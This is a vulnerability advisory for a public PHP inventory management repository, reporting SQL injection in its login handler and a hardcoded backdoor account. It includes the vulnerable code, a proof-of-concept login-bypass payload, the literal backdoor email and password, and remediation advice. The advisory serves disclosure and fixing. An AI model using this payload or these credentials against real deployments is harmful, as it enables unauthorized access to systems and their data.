# SQL Injection + Hardcoded Backdoor Credentials — Inventory Management

**Repository:** https://github.com/PuneethReddyHC/inventory_management_system  
**GitHub Issue:** https://github.com/PuneethReddyHC/inventory_management_system/issues/1  
**Severity:** Critical (CVSS v3.1: 9.8)  
**CWE:** CWE-89, CWE-798  
**CVE:** Pending  
**Discovered:** 2026-06-19

## Vulnerability 1: SQL Injection

### `login-backend.php`
```php
$email = mysqli_real_escape_string($con, $_POST["email"]);
$password = $_POST["password"];  // NOT escaped!
$sql = "SELECT * FROM cust WHERE email_id = '$email' AND password = '$password'";
```

Only `$email` is escaped — `$password` is NOT.

**PoC:**
```http
POST /login-backend.php
email=any@email.com&password=' OR '1'='1
```

## Vulnerability 2: Hardcoded Backdoor Credentials

```php
if ($_POST["email"]=="inventory@gmail.com" && $_POST["password"]=='inventory@123') {
    // Login bypass - hardcoded admin backdoor
}
```

**Backdoor login:**
```
email: inventory@gmail.com
password: inventory@123
```

## Fix
- Use prepared statements for all SQL queries
- Remove hardcoded credentials immediately
- Rotate all application credentials
